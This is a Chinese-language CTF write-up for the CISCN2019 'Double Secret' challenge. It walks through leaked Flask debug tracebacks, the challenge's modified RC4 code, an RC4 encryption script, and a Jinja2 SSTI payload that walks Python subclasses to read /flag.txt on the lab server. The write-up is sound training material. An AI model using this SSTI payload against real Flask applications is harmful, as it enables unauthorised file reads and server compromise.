# \[CISCN2019 华东南赛区]Double Secret

## \[CISCN2019 华东南赛区]Double Secret

## 考点

* Python代码审计
* rc4加解密
* flask debug
* flask SSTI

## wp

靶机只提示`Welcome To Find Secret`

尝试访问`secret`，提示

> Tell me your secret.I will encrypt it so others can't see

那再去传参`secret?secret=1`，返回`d`

传参`secret?secret='`，返回`r`

我传`/secret?secret=''''''`直接报错了

可以看到一部分代码

```python
if(secret==None):
  return 'Tell me your secret.I will encrypt it so others can\'t see'

rc=rc4_Modified.RC4("HereIsTreasure")   #解密
deS=rc.do_crypt(secret)

a=render_template_string(safe(deS))

if 'ciscn' in a.lower():
  return 'flag detected!'
return a
```

传个中文`secret?secret=啊`也看到了一部分代码

```python
  r = (self.Box[self.index_i] + self.Box[self.index_j]) % 256
  R = self.Box[r] # 生成伪随机数
  tmp=ord(s)^R
  test.append(tmp)
  out.append(chr(tmp))
#print(test)
#print(len(test))
return ''.join(out)
```

第一段代码是对传入的secret参数加密，然后用render\_template\_string渲染返回，这里就是SSTI了

第二段就是加密算法的代码了

pycryptodome库已经实现了rc4，可以直接拿来用

```python
from Crypto.Cipher import ARC4
from urllib import parse

# p = b"'"
p = b'1'
key = b'HereIsTreasure'
cipher = ARC4.new(key)

c = cipher.encrypt(p)
print(parse.quote(c))
# b'r'
# b'd'
```

可以看到结果是都符合的

但是问题是，用pycryptodome库的rc4加密的结果和wp是不一样的，就很奇怪

<mark style="background-color:orange;">对于</mark><mark style="background-color:orange;">`{{7*7}}`</mark><mark style="background-color:orange;">用pycryptodome的库加密后的密文是</mark><mark style="background-color:orange;">`.%14%0E%1F%FD%1A%16`</mark>

<mark style="background-color:orange;">wp的脚本加密结果是</mark><mark style="background-color:orange;">`.%14%0E%1F%C3%BD%1A%16`</mark>，可能是因为题目对RC4做了修改，从源码泄露可以看到有个`rc4_Modified.py`文件

看了一下wp，都是从网上找rc4的脚本，然后再按照SSTI的思路做就可以了。

```python
File "/app/rc4_Modified.py", line 43, in do_crypt
    r = (self.Box[self.index_i] + self.Box[self.index_j]) % 256
    R = self.Box[r] # 生成伪随机数
    tmp=ord(s)^R
    test.append(tmp)
    out.append(chr(tmp))
  #print(test)
  #print(len(test))
  return ''.join(out)
```

对payload进行rc4加密

```
{{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()}}
```

rc4加密脚本

```python
import base64
from urllib.parse import quote
def rc4_main(key = "init_key", message = "init_message"):
    # print("RC4加密主函数")
    s_box = rc4_init_sbox(key)
    crypt = str(rc4_excrypt(message, s_box))
    return  crypt
def rc4_init_sbox(key):
    s_box = list(range(256))
    # print("原来的 s 盒：%s" % s_box)
    j = 0
    for i in range(256):
        j = (j + s_box[i] + ord(key[i % len(key)])) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
    # print("混乱后的 s 盒：%s"% s_box)
    return s_box
def rc4_excrypt(plain, box):
    # print("调用加密程序成功。")
    res = []
    i = j = 0
    for s in plain:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j]) % 256
        k = box[t]
        res.append(chr(ord(s) ^ k))
    cipher = "".join(res)
    print("加密后的字符串是：%s" %quote(cipher))
    return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))
rc4_main("HereIsTreasure","{{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()}}")
```

题目rc4源码

```python
# -*- coding: utf-8 -*-
class RC4:
    def __init__(self,public_key = None):
        if not public_key:
            public_key = 'none_public_key'
        self.public_key = public_key
        self.index_i = 0
        self.index_j = 0
        self._init_box()

    def _init_box(self):
        """
        初始化 置换盒
        """
        self.Box = [i for i in range(256)]
        key_length = len(self.public_key)
        j = 0
        for i in range(256):
            index = ord(self.public_key[(i % key_length)])
            j = (j + self.Box[i] + index ) % 256
            self.Box[i],self.Box[j] = self.Box[j],self.Box[i]
        # for i in range(256):


    def do_crypt(self,string):
        """
        加密/解密
        string : 待加/解密的字符串
        """

        out = []
        test=[]
        #print(len(string))
        for s in string:
            self.index_i = (self.index_i + 1) % 256
            self.index_j = (self.index_j + self.Box[self.index_i]) % 256
            self.Box[self.index_i], self.Box[self.index_j] = self.Box[self.index_j],  self.Box[self.index_i]

            r = (self.Box[self.index_i] + self.Box[self.index_j]) % 256
            R = self.Box[r] # 生成伪随机数
            tmp=ord(s)^R
            test.append(tmp)
            out.append(chr(tmp))
        #print(test)
        #print(len(test))
        return ''.join(out)
```

